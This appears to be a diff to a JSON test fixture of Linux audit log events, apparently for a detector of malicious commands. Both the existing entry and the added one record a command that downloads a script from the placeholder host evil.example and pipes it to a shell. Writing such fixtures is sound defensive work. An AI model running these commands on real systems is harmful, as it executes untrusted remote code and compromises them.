@@ -25,6 +25,10 @@
         {
           "offset_seconds": 15,
           "raw": "type=EXECVE msg=audit(1763032815.100:1004): argc=3 a0=\"/usr/bin/curl\" a1=\"-s http://evil.example/p.sh | bash\" a2=\"-o\""
+        },
+        {
+          "offset_seconds": 20,
+          "raw": "type=EXECVE msg=audit(1763032820.100:1005): argc=3 a0=\"/bin/sh\" a1=\"-c\" a2=\"curl https://evil.example/p.sh | /bin/bash\""
         }
       ]
     }
